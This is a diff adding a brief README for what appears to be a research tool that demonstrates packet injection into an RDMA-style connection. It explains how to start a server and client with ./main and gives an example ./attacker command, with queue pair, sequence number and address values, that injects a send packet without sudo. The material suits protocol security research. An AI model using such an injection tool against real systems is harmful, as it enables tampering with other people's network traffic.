@@ -1,0 +1,23 @@
+Create a connection using ./main as a client as a server. See ./main -h
+Run ./attacker with correct info to inject one send packet.
+The server side will help and print all parameters. 
+
+
+Usage
+--------------------------
+
+
+On the server:
+./main -g 0
+where -g 0 is the index of used GID. 
+
+On the client:
+./main -g 0 192.168.1.10
+where -g 0 is the index of used GID, and 192.168.1.10 is the ip of the server.
+
+
+The server will output a command that can be executed at the client machine to inject without sudo. For example:
+./attacker  -i 1 -q 149 --psn=1 -s 0 -t 0 -g 0 -x 0x0 -z 0xa01a8c0ffff0000 
+
+
+
